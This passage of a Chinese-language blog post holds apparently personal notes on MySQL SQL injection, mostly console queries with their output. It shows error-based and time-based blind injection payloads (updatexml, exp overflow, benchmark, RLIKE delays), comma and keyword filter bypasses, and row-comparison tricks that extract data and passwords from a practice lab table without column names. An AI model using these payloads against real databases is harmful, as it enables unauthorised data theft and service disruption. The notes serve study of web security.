<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select version();</span><br><span class="line">+-----------+</span><br><span class="line">| version() |</span><br><span class="line">+-----------+</span><br><span class="line">| 8.0.13    |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select query from sys.statement_analysis;</span><br><span class="line">+-------------------------------------------------------------------+</span><br><span class="line">| query                                                             |</span><br><span class="line">+-------------------------------------------------------------------+</span><br><span class="line">| SELECT `cat` . `name` AS `CATA ... s_database` ( `sch` . `name` ) |</span><br><span class="line">| SELECT @@`skip_networking` , @ ... ssl_crlpath` , @@`tls_version` |</span><br><span class="line">| SELECT @@`version_comment` LIMIT ?                                |</span><br><span class="line">| SELECT `version` ( )                                              |</span><br><span class="line">+-------------------------------------------------------------------+</span><br><span class="line">4 rows in set (0.03 sec)</span><br></pre></td></tr></table></figure>

<h2 id="报错盲注"><a href="#报错盲注" class="headerlink" title="报错盲注"></a>报错盲注</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT 18446744073709551610 * 2;</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#x27;(18446744073709551610 * 2)&#x27;</span><br><span class="line">mysql&gt; SELECT 18446744073709551610 * 1;</span><br><span class="line">+--------------------------+</span><br><span class="line">| 18446744073709551610 * 1 |</span><br><span class="line">+--------------------------+</span><br><span class="line">|     18446744073709551610 |</span><br><span class="line">+--------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; SELECT updatexml(1,&#x27;@&#x27;,1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;&#x27;</span><br><span class="line">mysql&gt; SELECT updatexml(1,&#x27;1&#x27;,1);</span><br><span class="line">+--------------------+</span><br><span class="line">| updatexml(1,&#x27;1&#x27;,1) |</span><br><span class="line">+--------------------+</span><br><span class="line">| NULL               |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; SELECT pow(9999,100);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#x27;pow(9999,100)&#x27;</span><br><span class="line">mysql&gt; SELECT pow(9999,1);</span><br><span class="line">+-------------+</span><br><span class="line">| pow(9999,1) |</span><br><span class="line">+-------------+</span><br><span class="line">|        9999 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; SELECT exp((select 1)*18446744073709551615);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp((1 * 18446744073709551615))&#x27;</span><br><span class="line">mysql&gt; SELECT exp((select 0)*18446744073709551615);</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| exp((select 0)*18446744073709551615) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">|                                    1 |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p><a target="_blank" rel="noopener" href="https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/[https://www.cdxy.me/?p=789%5D(https://www.cdxy.me/?p=789)">MySQL时间盲注五种延时方法</a></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">sleep就不用说了</span><br><span class="line"></span><br><span class="line">BENCHMARK(count,expr) </span><br><span class="line">BENCHMARK()函数重复countTimes次执行表达式expr，它可以用于计时MySQL处理表达式有多快。结果值总是<span class="number">0</span>。</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> benchmark(<span class="number">10000000</span>,sha(<span class="number">1</span>));</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------+</span></span><br><span class="line"><span class="operator">|</span> benchmark(<span class="number">10000000</span>,sha(<span class="number">1</span>)) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------+</span></span><br><span class="line"><span class="operator">|</span>                          <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">2.02</span> sec)</span><br><span class="line"></span><br><span class="line">笛卡尔积</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> if(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>,(<span class="keyword">SELECT</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> information_schema.columns A, information_schema.columns B),<span class="number">0</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> if(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>,(<span class="keyword">SELECT</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> information_schema.columns A, information_schema.columns B),<span class="number">0</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                                                                    <span class="number">41809156</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">1.08</span> sec)</span><br><span class="line"></span><br><span class="line">GET_LOCK</span><br><span class="line">在一个session中可以先锁定一个变量例如：<span class="keyword">select</span> get_lock(<span class="string">&#x27;admin&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">然后通过另一个session 再次执行get_lock函数 <span class="keyword">select</span> get_lock(<span class="string">&#x27;admin&#x27;</span>,<span class="number">5</span>),此时会产生<span class="number">5</span> 秒的延迟，其效果类似于sleep(<span class="number">5</span>)。</span><br><span class="line">但是利用场景是有条件限制的：需要提供长连接。在Apache<span class="operator">+</span>PHP搭建的环境中需要使用 mysql_pconnect函数来连接数据库。</span><br></pre></td></tr></table></figure>

<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200703150557543.png" alt="image-20200703150557543"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">RLIKE<span class="operator">/</span>REGEXP</span><br><span class="line">通过rpad或repeat构造长字符串，加以计算量大的<span class="keyword">pattern</span>，通过repeat的参数可以控制延时长短。</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> rpad(<span class="string">&#x27;a&#x27;</span>,<span class="number">4999999</span>,<span class="string">&#x27;a&#x27;</span>) RLIKE concat(repeat(<span class="string">&#x27;(a.*)+&#x27;</span>,<span class="number">30</span>),<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> rpad(<span class="string">&#x27;a&#x27;</span>,<span class="number">4999999</span>,<span class="string">&#x27;a&#x27;</span>) RLIKE concat(repeat(<span class="string">&#x27;(a.*)+&#x27;</span>,<span class="number">30</span>),<span class="string">&#x27;b&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                                           <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">6.63</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> rpad(<span class="string">&#x27;a&#x27;</span>,<span class="number">4999999</span>,<span class="string">&#x27;a&#x27;</span>) regexp concat(repeat(<span class="string">&#x27;(a.*)+&#x27;</span>,<span class="number">30</span>),<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> rpad(<span class="string">&#x27;a&#x27;</span>,<span class="number">4999999</span>,<span class="string">&#x27;a&#x27;</span>) regexp concat(repeat(<span class="string">&#x27;(a.*)+&#x27;</span>,<span class="number">30</span>),<span class="string">&#x27;b&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                                            <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">6.75</span> sec)</span><br></pre></td></tr></table></figure>

<h2 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select user();</span><br><span class="line">+----------------+</span><br><span class="line">| user()         |</span><br><span class="line">+----------------+</span><br><span class="line">| root@localhost |</span><br><span class="line">+----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select mid(user() from -1);</span><br><span class="line">+---------------------+</span><br><span class="line">| mid(user() from -1) |</span><br><span class="line">+---------------------+</span><br><span class="line">| t                   |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select mid(user() from -2);</span><br><span class="line">+---------------------+</span><br><span class="line">| mid(user() from -2) |</span><br><span class="line">+---------------------+</span><br><span class="line">| st                  |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select * from users union select * from (select 1)a join (select 2)b join (select 3)c;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  1 | 2        | 3          |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h2 id="数字型过滤and-or"><a href="#数字型过滤and-or" class="headerlink" title="数字型过滤and or"></a>数字型过滤and or</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=1/(select sleep(3));</span><br><span class="line">Empty set, 17 warnings (51.06 sec)</span><br></pre></td></tr></table></figure>

<h2 id="无information-schema找表名的替代方法"><a href="#无information-schema找表名的替代方法" class="headerlink" title="无information_schema找表名的替代方法"></a>无information_schema找表名的替代方法</h2><p><a target="_blank" rel="noopener" href="https://osandamalith.com/2020/01/27/alternatives-to-extract-tables-and-columns-from-mysql-and-mariadb/">Alternatives to Extract Tables and Columns from MySQL and MariaDB</a><br>需要mysql版本&gt;5.7</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from sys.x$schema_flattened_keys;</span><br><span class="line">+--------------+-----------------------+-----------------+------------+----------------+-----------------------------------+</span><br><span class="line">| table_schema | table_name            | index_name      | non_unique | subpart_exists | index_columns                     |</span><br><span class="line">+--------------+-----------------------+-----------------+------------+----------------+-----------------------------------+</span><br><span class="line">| security     | emails                | PRIMARY         |          0 |              0 | id                                |</span><br><span class="line">| security     | referers              | PRIMARY         |          0 |              0 | id                                |</span><br><span class="line">| security     | uagents               | PRIMARY         |          0 |              0 | id                                |</span><br><span class="line">| security     | users                 | PRIMARY         |          0 |              0 | id                                |</span><br><span class="line">+--------------+-----------------------+-----------------+------------+----------------+-----------------------------------+</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from sys.schema_table_statistics;</span><br></pre></td></tr></table></figure>

<h2 id="在没有列名的情况下检索数据"><a href="#在没有列名的情况下检索数据" class="headerlink" title="在没有列名的情况下检索数据"></a>在没有列名的情况下检索数据</h2><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-87b723085b589735.png" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM USERS WHERE ID =1;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | 123      | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; SELECT * FROM USERS WHERE ID = ((select 1,123,&#x27;Dumb&#x27;) &lt;= (select * from users limit 1));</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | 123      | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT * FROM USERS WHERE ID = ((select 2,123,&#x27;Dumb&#x27;) &lt;= (select * from users limit 1));</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>通过小于号替换等号，可以逐字符检索出数据。不过还有一个问题——<code>MySQL中的字符串比较在默认情况下是不区分大小写的</code>。</p>
<p>将字符串转换为二进制格式后，会强制进行字节对字节的比较</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select &#x27;d&#x27;=&#x27;D&#x27;;</span><br><span class="line">+---------+</span><br><span class="line">| &#x27;d&#x27;=&#x27;D&#x27; |</span><br><span class="line">+---------+</span><br><span class="line">|       1 |</span><br><span class="line">+---------+</span><br><span class="line">1 row in set (0.00 sec)  </span><br><span class="line">mysql&gt; select BINARY(&#x27;d&#x27;)&gt;BINARY(&#x27;D&#x27;);</span><br><span class="line">+-------------------------+</span><br><span class="line">| BINARY(&#x27;d&#x27;)&gt;BINARY(&#x27;D&#x27;) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       1 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select (select 1,123,BINARY(&#x27;dumb&#x27;)) &lt;= (select * from users limit 1);</span><br><span class="line">+----------------------------------------------------------------+</span><br><span class="line">| (select 1,123,BINARY(&#x27;dumb&#x27;)) &lt;= (select * from users limit 1) |</span><br><span class="line">+----------------------------------------------------------------+</span><br><span class="line">|                                                              0 |</span><br><span class="line">+----------------------------------------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure>

<p>不过<code>BINARY</code>中含有关键字<code>in</code>。<br>MySQL中的JSON对象是二进制对象，因此，<code>CAST(0 AS JSON)</code>会返回一个二进制字符串，进而<code>SELECT CONCAT(“A”, CAST(0 AS JSON))</code>也会返回一个二进制字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CAST (expression AS data_type)</span><br><span class="line">参数说明：</span><br><span class="line"></span><br><span class="line">expression：任何有效的SQServer表达式。</span><br><span class="line">AS：用于分隔两个参数，在AS之前的是要处理的数据，在AS之后是要转换的数据类型。</span><br><span class="line">data_type：目标系统所提供的数据类型，包括bigint和sql_variant，不能使用用户定义的数据类型。</span><br></pre></td></tr></table></figure>

